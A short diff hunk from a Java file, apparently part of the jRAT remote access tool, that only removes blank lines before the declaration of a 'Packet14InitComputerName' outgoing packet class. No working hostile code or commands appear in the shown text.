@@ -4,8 +4,6 @@ import java.io.DataOutputStream;
 
 import pro.jrat.common.io.StringWriter;
 
-
-
 public class Packet14InitComputerName extends AbstractOutgoingPacket {
 
 	private String computerName;
